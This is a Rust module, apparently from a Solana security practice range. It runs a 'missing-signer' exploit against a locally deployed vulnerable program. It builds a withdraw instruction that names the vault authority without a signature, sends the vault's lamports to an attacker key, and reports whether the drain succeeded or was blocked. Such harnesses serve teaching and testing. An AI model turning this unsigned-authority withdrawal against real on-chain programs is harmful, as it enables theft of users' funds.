use solana_address::Address;
use solana_instruction::{AccountMeta, Instruction};
use solana_signer::Signer;
use solana_system_interface::program as system_program;

use crate::{
    Mode,
    artifact::ensure_artifact,
    error::RangeError,
    harness::Harness,
    outcome::{AccountDelta, ExploitOutcome},
};

pub const SLUG: &str = "missing-signer";
pub const PROGRAM_ID: Address = Address::new_from_array([0x51; 32]);

const WITHDRAW: u8 = 0;
const AMOUNT: u64 = 3_000_000_000;

pub fn program_id() -> Address {
    PROGRAM_ID
}

pub fn run(mode: Mode) -> Result<ExploitOutcome, RangeError> {
    let artifact = ensure_artifact(SLUG, mode)?;
    let mut harness = Harness::deploy(PROGRAM_ID, &artifact)?;

    let authority = Harness::keypair(0xA1);
    let attacker = Harness::keypair(0xB1);
    let vault = Address::new_from_array([0x61; 32]);

    harness.set_account(
        vault,
        AMOUNT,
        authority.pubkey().to_bytes().to_vec(),
        PROGRAM_ID,
    )?;
    harness.set_account(
        authority.pubkey(),
        1_000_000,
        Vec::new(),
        system_program::ID,
    )?;

    let mut data = Vec::with_capacity(9);
    data.push(WITHDRAW);
    data.extend_from_slice(&AMOUNT.to_le_bytes());

    let instruction = Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new_readonly(authority.pubkey(), false),
            AccountMeta::new(vault, false),
            AccountMeta::new(attacker.pubkey(), false),
        ],
        data,
    };

    let vault_before = harness.lamports(&vault);
    let destination_before = harness.lamports(&attacker.pubkey());
    let result = harness.execute(&[instruction]);
    let vault_after = harness.lamports(&vault);
    let destination_after = harness.lamports(&attacker.pubkey());

    let changes = vec![
        AccountDelta::new("vault", vault_before, vault_after),
        AccountDelta::new(
            "attacker destination",
            destination_before,
            destination_after,
        ),
    ];

    match result {
        Ok(_) => {
            let expected_destination = destination_before.saturating_add(AMOUNT);
            if vault_after == 0 && destination_after == expected_destination {
                Ok(ExploitOutcome::succeeded(
                    "the vault paid out for an authority account that never signed",
                    changes,
                )
                .with_note(format!(
                    "authority {} was supplied with is_signer = false",
                    authority.pubkey()
                )))
            } else {
                Err(RangeError::Broken {
                    slug: SLUG,
                    detail: format!(
                        "the withdraw transaction succeeded but state does not match the exploit: \
                         vault {vault_after}, destination {destination_after}"
                    ),
                })
            }
        }
        Err(error) => {
            if vault_after != vault_before || destination_after != destination_before {
                return Err(RangeError::Broken {
                    slug: SLUG,
                    detail: format!(
                        "the rejected withdraw changed state: vault {vault_before} -> {vault_after}, \
                         destination {destination_before} -> {destination_after}"
                    ),
                });
            }
            Ok(ExploitOutcome::blocked(
                "the unsigned authority was rejected and the vault stayed funded",
                format!("{error:?}"),
                changes,
            ))
        }
    }
}
